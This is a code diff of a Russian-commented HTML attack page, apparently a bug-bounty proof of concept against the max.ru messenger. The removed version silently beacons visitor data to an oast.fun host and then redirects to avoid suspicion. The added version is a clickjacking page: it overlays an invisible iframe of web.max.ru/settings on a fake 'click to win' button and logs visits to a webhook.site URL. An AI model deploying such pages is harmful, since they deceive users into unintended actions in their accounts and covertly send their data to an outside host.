@@ -1,54 +1,46 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-    <meta charset="UTF-8">
     <style>
-        body, html {
-            margin: 0; padding: 0; width: 100%; height: 100%;
-            background-color: #f0f2f5; /* Цвет фона мессенджера */
-            display: flex; align-items: center; justify-content: center;
-            font-family: sans-serif; cursor: default;
+        /* Слой с твоим ловушечным сайтом (прозрачный) */
+        #victim-iframe {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            opacity: 0.0; /* ДЕЛАЕТ ВСЁ НЕВИДИМЫМ */
+            z-index: 2;
         }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 30px; height: 30px;
-            animation: spin 1s linear infinite;
+        /* Слой, который видит пользователь (приманка) */
+        #decoy-content {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #fff;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn-fake {
+            padding: 20px;
+            background: #007bff;
+            color: white;
+            border-radius: 8px;
+            font-family: sans-serif;
+        }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
+    <div id="decoy-content">
+        <div class="btn-fake">НАЖМИ ЧТОБЫ ВЫИГРАТЬ</div>
+    </div>
+
+    <iframe id="victim-iframe" src="https://web.max.ru/settings"></iframe>
 
     <script>
-        (function() {
-            const hook = "https://zmsfeowzqscjsayavbfeauqv1m9qlng0x.oast.fun";
-            
-            // Собираем данные
-            const data = {
-                ts: new Date().getTime(),
-                ref: document.referrer, // Откуда пришел (важно для BB)
-                sw: window.screen.width,
-                sh: window.screen.height,
-                ua: navigator.userAgent
-            };
-
-            const payload = btoa(JSON.stringify(data));
-            
-            // Скрытая отправка через Beacon API (надежнее картинок)
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(`${hook}/log?d=${payload}`);
-            } else {
-                new Image().src = `${hook}/img?d=${payload}`;
-            }
-
-            // Через 2 секунды редирект на официальный сайт, чтобы не вызывать подозрения
-            setTimeout(() => {
-                window.location.href = "https://max.ru";
-            }, 2000);
-        })();
+        // Твой логгер тоже сработает при загрузке
+        const hook = "https://webhook.site/8cda2992-b523-4748-a5a4-616893cf1435";
+        new Image().src = hook + "/VISIT_DETECTED?ua=" + btoa(navigator.userAgent);
     </script>
 </body>
 </html>
